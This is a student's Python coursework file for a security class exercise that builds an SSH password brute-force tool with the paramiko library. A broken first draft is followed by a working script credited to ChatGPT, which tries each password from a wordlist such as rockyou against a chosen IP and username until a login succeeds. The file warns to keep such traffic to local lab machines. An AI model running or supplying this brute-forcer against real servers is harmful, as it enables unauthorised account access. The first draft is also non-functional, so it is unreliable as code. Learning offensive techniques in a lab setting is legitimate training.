# Ops401d6 Code-Challenge Day 17

# Justin 'Sage' Tabios
# Utilized Demo code (Alex White) & ChatGPT

# Add to your Python brute force tool the capability to:

# Authenticate to an SSH server by its IP address.
# Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
# ----- Stay out of trouble! Restrict this kind of traffic to your local network VMs -----

# ----- TOOLS -----
import sys, os

# SSH Library -> https://www.paramiko.org/
import paramiko

# ----- VARIABLES -----
host = input("Enter target host: ")
username = input("Enter target username: ")
filepath = input("Enter your wordlist filepath:\n")
port = 22

def connect_to_SSH():
  # setup the SSHClient
  sshConnection = paramiko.SSHClient()
  # Auto-add host-key policy!
  sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy)
  # WHILE ITERATING through password list
    # TRY connection EXCEPT: Failed to Authenticate and KeyboardInterrupt
  try:
    # Create the SSH connection with info: host, port, username, and password. 
    sshConnection.connect(host, port, username, "password")
    # print useful information if connected!

  except paramiko.AuthenticationException:
    print("Authentication Failed!\n")

  except KeyboardInterrupt:
    print("\n\n[*] User requested an interrupt.")
    sys.exit() # this is Ctrl + C

  # If password was incorrect, move to next password. hint: .readline()
  file = open("filepath", encoding="ISO-8859-1")
  line = file.readline()
  file.close()
  # Make sure to close your I/O resources, a.k.a file reader
  # Close the SSH connection as well according to Paramiko's docs
  sshConnection.close()

def iterator():
  print("Iterate through rockyou passwords!")
  return

def checkPassword():
  print("Check password ran")
  return

if __name__ == "__main__": # when my computer runs this file...do this stuff


    while True:
        mode = input("""
Brue Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - Exit
    Please enter a number:
""")
        if (mode == "1"):
            iterator()
        elif (mode == "2"):
            checkPassword()
        elif (mode == '3'):
            break
        else:
            print("Invalid selection...")

# ChatGPT script
# Import libraries
import time
import paramiko

# Declare functions
def iterator():
    filepath = input("Enter your dictionary filepath:\n")
    
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            word = line.rstrip()
            print(word)
            time.sleep(1)

def check_password():
    target = input("Enter the password you want to search for:\n")
    filepath = input("Enter your dictionary filepath:\n")
    
    found = False
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            word = line.rstrip()
            if word == target:
                found = True
                break
    
    if found:
        print("The password was found in the word list.")
    else:
        print("The password was not found in the word list.")

def ssh_login():
    ip = input("Enter the IP address of the SSH server:\n")
    username = input("Enter the username:\n")
    filepath = input("Enter your dictionary filepath:\n")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            password = line.rstrip()
            try:
                ssh.connect(ip, username=username, password=password, timeout=5)
                print(f"Successful login with password: {password}")
                ssh.close()
                break
            except paramiko.AuthenticationException:
                print(f"Failed login with password: {password}")
            except Exception as e:
                print(f"Error occurred: {e}")
                break

# Main

if __name__ == "__main__":
    while True:
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - SSH Login
4 - Exit
Please enter a number: 
""")
        if mode == "1":
            iterator()
        elif mode == "2":
            check_password()
        elif mode == "3":
            ssh_login()
        elif mode == '4':
            break
        else:
            print("Invalid selection...")

